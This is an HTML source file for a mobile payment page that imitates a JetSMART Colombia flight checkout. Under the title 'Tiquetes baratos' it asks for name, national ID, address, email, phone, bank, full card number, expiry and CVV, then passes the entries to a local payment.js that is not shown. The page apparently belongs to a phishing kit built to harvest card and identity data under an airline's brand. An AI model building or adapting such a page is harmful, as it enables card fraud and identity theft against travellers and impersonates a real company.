<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Información Personal | Tiquetes baratos</title>
    <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon">

    <link rel="stylesheet" href="./css/normalize.css">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="stylesheet" href="./css/utils.css">


    <script src="./js/functions.js"></script>

    <script>
        ! function(f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function() {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script',
            'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1336585420999046');
        fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none"
            src="https://www.facebook.com/tr?id=1336585420999046&ev=PageView&noscript=1" /></noscript>
    </head>

<body>
    <div class="loader">
        <svg class="svg-calLoader" xmlns="http://www.w3.org/2000/svg" width="230" height="230">
            <path class="cal-loader__path"
                d="M86.429 40c63.616-20.04 101.511 25.08 107.265 61.93 6.487 41.54-18.593 76.99-50.6 87.643-59.46 19.791-101.262-23.577-107.142-62.616C29.398 83.441 59.945 48.343 86.43 40z"
                fill="none" stroke="#0099cc" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"
                stroke-dasharray="10 10 10 10 10 10 10 432" stroke-dashoffset="77" />
            <path class="cal-loader__plane"
                d="M141.493 37.93c-1.087-.927-2.942-2.002-4.32-2.501-2.259-.824-3.252-.955-9.293-1.172-4.017-.146-5.197-.23-5.47-.37-.766-.407-1.526-1.448-7.114-9.773-4.8-7.145-5.344-7.914-6.327-8.976-1.214-1.306-1.396-1.378-3.79-1.473-1.036-.04-2-.043-2.153-.002-.353.1-.87.586-1 .952-.139.399-.076.71.431 2.22.241.72 1.029 3.386 1.742 5.918 1.644 5.844 2.378 8.343 2.863 9.705.206.601.33 1.1.275 1.125-.24.097-10.56 1.066-11.014 1.032a3.532 3.532 0 0 1-1.002-.276l-.487-.246-2.044-2.613c-2.234-2.87-2.228-2.864-3.35-3.309-.717-.287-2.82-.386-3.276-.163-.457.237-.727.644-.737 1.152-.018.39.167.805 1.916 4.373 1.06 2.166 1.964 4.083 1.998 4.27.04.179.004.521-.076.75-.093.228-1.109 2.064-2.269 4.088-1.921 3.34-2.11 3.711-2.123 4.107-.008.25.061.557.168.725.328.512.72.644 1.966.676 1.32.029 2.352-.236 3.05-.762.222-.171 1.275-1.313 2.412-2.611 1.918-2.185 2.048-2.32 2.45-2.505.241-.111.601-.232.82-.271.267-.058 2.213.201 5.912.8 3.036.48 5.525.894 5.518.914 0 .026-.121.306-.27.638-.54 1.198-1.515 3.842-3.35 9.021-1.029 2.913-2.107 5.897-2.4 6.62-.703 1.748-.725 1.833-.594 2.286.137.46.45.833.872 1.012.41.177 3.823.24 4.37.085.852-.25 1.44-.688 2.312-1.724 1.166-1.39 3.169-3.948 6.771-8.661 5.8-7.583 6.561-8.49 7.387-8.702.233-.065 2.828-.056 5.784.011 5.827.138 6.64.09 8.62-.5 2.24-.67 4.035-1.65 5.517-3.016 1.136-1.054 1.135-1.014.207-1.962-.357-.38-.767-.777-.902-.893z"
                class="cal-loader__plane" fill="#000033" />
        </svg>
    </div>

    <nav>
        <div class="d-flex justify-space-between p-2 border-bottom-red">
            <div>
                <img src="./assets/media/jetsmart-logo.svg" width="130px">
            </div>
            <div class="d-flex flex-row align-items-center">
                <img class="rounded-circle mr-1" src="./assets/media/colombia.png" width="12px" height="12px">
                <span>Colombia</span>
                <div class="ml-1">
                    <img src="./assets/media/hamburguer_menu.png" width="35px">
                    <p class="fs-7 m-0 text-center">MENÚ</p>
                </div>
            </div>
        </div>
    </nav>

    <main class="bg-gray-soft pl-2 pr-2">
        <div class="d-flex align-items-center justify-content-center p-3">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Logo_JetSmart.svg/2560px-Logo_JetSmart.svg.png" width="230px">
        </div>

        <div class="passengers-container">
            <p class="m-0 fs-2 tc-blue fw-bolder">Paga tu reserva</p>
            <p class="m-0 fs-2 tc-cian fw-bolder border-bottom-gray pb-2 mb-2" id="label-departures">Bogotá - Medellín |
                Medellín - Bogotá</p>
            <div class="d-flex flex-row justify-content-evenly align-items-center mb-2">
                <svg fill="#59c3d9" width="50px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg"
                    xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 128 128" xml:space="preserve">
                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                    <g id="SVGRepo_iconCarrier">
                        <path
                            d="M44.7,46.3c-2.1-13.7,17.6-17.8,20.8-3.9l5.4,26.8l20.1,0c5.8,0,8.9,4.7,8.9,9v36.4c0,8.9-12.6,8.8-12.6-0.2V86.2H61.6 c-6,0-9.7-4.1-10.6-8.8L44.7,46.3z">
                        </path>
                        <path
                            d="M54.1,30.3c6.5,0,11.8-5.2,11.9-11.8C66,12,60.7,6.7,54.1,6.7c-6.5,0-11.8,5.2-11.8,11.7C42.3,25,47.5,30.3,54.1,30.3">
                        </path>
                        <path
                            d="M28.4,60.6c-1.4-7.6,8.6-9.4,10-1.8l4.4,23.9c1,5,4.6,9.2,9.8,10.8c1.6,0.5,3.3,0.5,4.8,0.6l14.5,0.1 c7.7,0,7.7,10.1-0.1,10.1l-15.2-0.1c-2.3,0-4.7-0.3-7-1c-9-2.7-15.3-10.1-16.9-18.7L28.4,60.6z">
                        </path>
                    </g>
                </svg>
                <p class="m-0 fs-2 fw-bolder tc-blue">Información del titular</p>
            </div>

            <form id="main-form">
                <div class="input-container">
                    <input required type="text" id="name" required>
                    <label>Nombres*</label>
                </div>
                <div class="input-container">
                    <input required type="text" id="surname" required>
                    <label>Apellidos*</label>
                </div>
                <div class="select-container">
                    <label class="select-container-label">Tipo de documento</label>
                    <select class="select-container-select" id="">
                        <option value="">DNI</option>
                        <option value="">CC</option>
                        <option value="">CE</option>
                        <option value="">Pasaporte</option>
                    </select>
                </div>
                <div class="input-container">
                    <input required type="number" id="cc" required>
                    <label>Documento de Identidad</label>
                </div>
                <div class="input-container">
                    <input required type="text" id="city" required>
                    <label>Ciudad</label>
                </div>
                <div class="input-container">
                    <input required type="text" id="address" required>
                    <label>Dirección</label>
                </div>
                <div class="input-container">
                    <input required type="email" id="email" required>
                    <label>Email</label>
                </div>
                <div class="input-container">
                    <input required type="number" id="telnum" required>
                    <label>Teléfono</label>
                </div>


                <div id="payment-method">
                    <div class="d-flex flex-row justify-content-evenly align-items-center mb-2 mt-5">
                        <svg version="1.0" width="40px" id="Layer_1" xmlns="http://www.w3.org/2000/svg"
                            xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 64 64"
                            enable-background="new 0 0 64 64" xml:space="preserve" fill="#59c3d9">
                            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                            <g id="SVGRepo_iconCarrier">
                                <g>
                                    <rect x="46" y="40" fill="#59c3d9" width="6" height="4"></rect>
                                    <rect y="20" fill="#59c3d9" width="64" height="8"></rect>
                                    <path fill="#59c3d9" d="M64,18v-6c0-2.211-1.789-4-4-4H4c-2.211,0-4,1.789-4,4v6H64z">
                                    </path>
                                    <path fill="#59c3d9"
                                        d="M0,30v22c0,2.211,1.789,4,4,4h56c2.211,0,4-1.789,4-4V30H0z M21,46H11c-0.553,0-1-0.447-1-1s0.447-1,1-1h10 c0.553,0,1,0.447,1,1S21.553,46,21,46z M25,40H11c-0.553,0-1-0.447-1-1s0.447-1,1-1h14c0.553,0,1,0.447,1,1S25.553,40,25,40z M35,40h-6c-0.553,0-1-0.447-1-1s0.447-1,1-1h6c0.553,0,1,0.447,1,1S35.553,40,35,40z M54,45c0,0.553-0.447,1-1,1h-8 c-0.553,0-1-0.447-1-1v-6c0-0.553,0.447-1,1-1h8c0.553,0,1,0.447,1,1V45z">
                                    </path>
                                </g>
                            </g>
                        </svg>
                        <p class="m-0 fs-2 fw-bolder tc-blue">Elige tu método de pago</p>
                    </div>

                    <div class="d-flex flex-column align-items-center justify-content-center mb-2">
                        <img src="./assets/media/visa_mc_f.png" class="border-gray-3 rounded-10">
                        <p class="m-0 mt-1 fs-3 tc-blue fw-bold">Tarjeta débito</p>
                    </div>

                    <div class="d-flex flex-column align-items-center justify-content-center mb-2">
                        <img src="./assets/media/visa_mc_f.png" class="border-gray-3 rounded-10">
                        <p class="m-0 mt-1 fs-3 tc-blue fw-bold">Tarjeta crédito</p>
                    </div>

                    <div class="d-flex flex-column align-items-center justify-content-center">
                        <img src="./assets/media/amex_b.png" class="border-gray-3 rounded-10">
                        <p class="m-0 mt-1 fs-3 tc-blue fw-bold">Tarjeta AMEX</p>
                    </div>


                </div>

                <div class="d-flex flex-column align-items-center justify-content-center mt-2" id="pse-button">
                    <img src="./assets/media/pse.webp" class="border-gray-3 rounded-10"
                        style="padding-left: 65px; padding-right: 65px; padding-top: 20px; padding-bottom: 20px;">
                    <p class="m-0 mt-1 fs-3 tc-blue fw-bold">Pago PSE</p>
                </div>

                <div id="cc-form">
                    <div id="card-inputs" class="hide">
                        <div class="select-container">
                            <label>Entidad Financiera</label>
                            <select id="ban" required>
                                <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
                                <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
                                <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
                                <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
                                <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
                                <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO
                                    COOPERATIVO COOPCENTRAL</option>
                                <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA
                                </option>
                                <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
                                <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
                                <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
                                <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
                                <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC
                                </option>
                                <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
                                <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
                                <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
                                <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
                                <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA
                                </option>
                                <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
                                <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
                                <option label="BANCOLOMBIA" value="bancolombia" selected>BANCOLOMBIA</option>
                                <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
                                <option label="CFA COOPERATIVA FINANCIERA" value="cfa">CFA COOPERATIVA FINANCIERA
                                </option>
                                <option label="CITIBANK " value="citibank">CITIBANK</option>
                                <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
                                <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA
                                    FINANCIERA</option>
                                <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA
                                    FINANCIERA</option>
                                <option label="COTRAFA" value="cotrafa">COTRAFA</option>
                                <option label="DALE" value="dale">DALE</option>
                                <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
                                <option label="IRIS" value="iris">IRIS</option>
                                <option label="LULO BANK" value="lulo">LULO BANK</option>
                                <option label="MOVII S.A." value="movii">MOVII S.A.</option>
                                <option label="NEQUI" value="nequi">NEQUI</option>
                                <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
                                <option label="RAPPIPAY DAVIPLATA" value="rappipay">RAPPIPAY DAVIPLATA</option>
                                <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA
                                </option>
                            </select>
                        </div>

                        <div class="input-container mb-1">
                            <input required type="text" required oninput="formatCNumber(this)" id="p">
                            <label for="origin">Número de tarjeta</label>
                        </div>
                        <div class="d-flex flex-row justify-space-between mb-4">
                            <div class="input-container mb-1 mr-2">
                                <input oninput="formatDate(this)" id="pdate" required type="text" required>
                                <label for="origin">Expiración</label>
                            </div>
                            <div class="input-container mb-1">
                                <input id="c" required type="number" required oninput="limitDigits(this, 3)">
                                <label for="origin">CVV</label>
                            </div>
                        </div>
                    </div>


                </div>

                <div id="pse-form">
                    <div id="pse-inputs" class="hide">
                        <div class="select-container">
                            <label>Entidad Financiera</label>
                            <select id="ban-pse" required>
                                <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
                                <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
                                <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
                                <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
                                <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
                                <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO
                                    COOPERATIVO COOPCENTRAL</option>
                                <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA
                                </option>
                                <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
                                <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
                                <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
                                <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
                                <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC
                                </option>
                                <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
                                <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
                                <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
                                <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
                                <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA
                                </option>
                                <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
                                <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
                                <option label="BANCOLOMBIA" value="bancolombia" selected>BANCOLOMBIA</option>
                                <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
                                <option label="CFA COOPERATIVA FINANCIERA" value="cfa">CFA COOPERATIVA FINANCIERA
                                </option>
                                <option label="CITIBANK " value="citibank">CITIBANK</option>
                                <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
                                <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA
                                    FINANCIERA</option>
                                <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA
                                    FINANCIERA</option>
                                <option label="COTRAFA" value="cotrafa">COTRAFA</option>
                                <option label="DALE" value="dale">DALE</option>
                                <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
                                <option label="IRIS" value="iris">IRIS</option>
                                <option label="LULO BANK" value="lulo">LULO BANK</option>
                                <option label="MOVII S.A." value="movii">MOVII S.A.</option>
                                <option label="NEQUI" value="nequi">NEQUI</option>
                                <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
                                <option label="RAPPIPAY DAVIPLATA" value="rappipay">RAPPIPAY DAVIPLATA</option>
                                <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA
                                </option>
                            </select>
                        </div>
                    </div>
                </div>

                <div class="p-2 mt-2">
                    <div class="d-flex flex-column border-blue-1 rounded-10 pl-4 pr-4 pt-2 pb-2">
                        <div class="d-flex flex-row align-items-center justify-space-between border-bottom pb-1">
                            <img src="./assets/media/i_blue_shield.png" class="mr-3 ml-4" width="30px">
                            <div class="d-flex flex-column">
                                <p class="m-0 fs-3 fw-bold tc-blue">!No te preocupes!</p>
                                <p class="m-0 fs-6 fw-bold tc-blue">Este precio es el total a pagar, ya incluye
                                    tasas de embarque e impuestos.</p>
                            </div>
                        </div>

                        <div class="ml-4 mt-1">
                            <p class="m-0 tc-blue fw-bold fs-6">Total de tu reserva:</p>
                            <p class="m-0 tc-blue fw-bolder fs-3" id="label-total-resume"></p>
                        </div>
                    </div>
                </div>

                <button type="submit" class="hide" id="submit-form">

                </button>

            </form>
        </div>
    </main>
    <div class="btn-fixed" id="btn-next-step" data-submit-form="#main-form">
        Continuar
    </div>
    <div class="btn-fixed hide" id="btn-next-step-pse">
        Continuar
    </div>

    <footer class="mb-7">
        <div class="border-top-red mt-2 p-3 d-flex flex-column align-items-center justify-content-center">
            <p class="fs-6 m-0">© 2025 JetSMART Colombia</p>
            <img src="./assets/media/jetsmart-logo.svg" width="180px">
        </div>
    </footer>

    <script src="./js/payment.js?v=<?php echo time(); ?>"></script>
    <script type="text/javascript">
        document.getElementById('btn-next-step').addEventListener('click', function() {
            fbq('track', 'Purchase', {
                value: 46100,
                currency: 'COP',
                contents: [{
                    quantity: 1
                }]
            });
        }, false);
    </script>
</body>

</html>
